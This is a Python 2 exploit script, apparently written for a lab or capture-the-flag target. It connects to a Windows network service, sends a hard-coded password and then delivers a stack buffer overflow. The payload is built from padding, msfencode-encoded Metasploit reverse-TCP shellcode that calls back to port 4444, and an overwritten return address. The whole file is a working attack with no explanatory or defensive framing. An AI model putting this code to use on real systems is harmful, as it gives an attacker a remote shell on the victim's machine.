#!/usr/bin/python

import socket, sys, struct

'''
 * windows/shell_reverse_tcp - 314 bytes
 * http://www.metasploit.com
 * VERBOSE=false, LHOST=127.0.0.1, LPORT=4444, 
 * ReverseConnectRetries=5, EXITFUNC=process, 
 * InitialAutoRunScript=, AutoRunScript=
'''
#encoded  with msfencode
shellcode = "\xda\xd7\xd9\x74\x24\xf4\xbb\x69\xef\xe0\x2f\x58\x31\xc9"\
"\xb1\x4f\x31\x58\x19\x83\xc0\x04\x03\x58\x15\x8b\x1a\x1c"\
"\xc7\xc2\xe5\xdd\x18\xb4\x6c\x38\x29\xe6\x0b\x48\x18\x36"\
"\x5f\x1c\x91\xbd\x0d\xb5\x22\xb3\x99\xba\x83\x79\xfc\xf5"\
"\x14\x4c\xc0\x5a\xd6\xcf\xbc\xa0\x0b\x2f\xfc\x6a\x5e\x2e"\
"\x39\x96\x91\x62\x92\xdc\x00\x92\x97\xa1\x98\x93\x77\xae"\
"\xa1\xeb\xf2\x71\x55\x41\xfc\xa1\xc6\xde\xb6\x59\x6c\xb8"\
"\x66\x5b\xa1\xdb\x5b\x12\xce\x2f\x2f\xa5\x06\x7e\xd0\x97"\
"\x66\x2c\xef\x17\x6b\x2d\x37\x9f\x94\x58\x43\xe3\x29\x5a"\
"\x90\x99\xf5\xef\x05\x39\x7d\x57\xee\xbb\x52\x01\x65\xb7"\
"\x1f\x46\x21\xd4\x9e\x8b\x59\xe0\x2b\x2a\x8e\x60\x6f\x08"\
"\x0a\x28\x2b\x31\x0b\x94\x9a\x4e\x4b\x70\x42\xea\x07\x93"\
"\x97\x8c\x45\xfc\x54\xa2\x75\xfc\xf2\xb5\x06\xce\x5d\x6d"\
"\x81\x62\x15\xab\x56\x84\x0c\x0b\xc8\x7b\xaf\x6b\xc0\xbf"\
"\xfb\x3b\x7a\x69\x84\xd0\x7a\x96\x51\x76\x2b\x38\x0a\x36"\
"\x9b\xf8\xfa\xde\xf1\xf6\x25\xfe\xf9\xdc\x53\x39\x6d\xa0"\
"\x63\xc5\x6f\x36\x66\xc5\x7e\x9a\xef\x23\xea\x32\xa6\xfc"\
"\x83\xab\xe3\x76\x35\x33\x3e\x1e\xd6\xa6\xa5\xde\x91\xda"\
"\x71\x89\xf6\x2d\x88\x5f\xeb\x14\x22\x7d\xf6\xc1\x0d\xc5"\
"\x2d\x32\x93\xc4\xa0\x0e\xb7\xd6\x7c\x8e\xf3\x82\xd0\xd9"\
"\xad\x7c\x97\xb3\x1f\xd6\x41\x6f\xf6\xbe\x14\x43\xc9\xb8"\
"\x18\x8e\xbf\x24\xa8\x67\x86\x5b\x05\xe0\x0e\x24\x7b\x90"\
"\xf1\xff\x3f\xa0\xbb\x5d\x69\x29\x62\x34\x2b\x34\x95\xe3"\
"\x68\x41\x16\x01\x11\xb6\x06\x60\x14\xf2\x80\x99\x64\x6b"\
"\x65\x9d\xdb\x8c\xac"

if len(sys.argv) != 3:
	print "supply IP PORT"
	sys.exit(-1)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect( (sys.argv[1], int(sys.argv[2])) )

###send
message = "secret\n\x00"
sock.sendall(message)

###recieve
data = sock.recv(10000)
print data

###send
ret_addr=0x6E95762B
breakpoint = ""
ret_addr_s=struct.pack('L', 0x6E95762B)
pad = "B" * 400
nops_len = 1048 - len(shellcode) - len(pad) - len(breakpoint)
exploit = "A" * nops_len
exploit += breakpoint
exploit += shellcode
exploit += pad
exploit += ret_addr_s
print("NOPS=%d, shellcode=%d, pad=%d, ret_addr=%x\n" % (nops_len, len(shellcode), len(pad), ret_addr ) )
sock.sendall(exploit)

###recieve
data = sock.recv(10000)
print data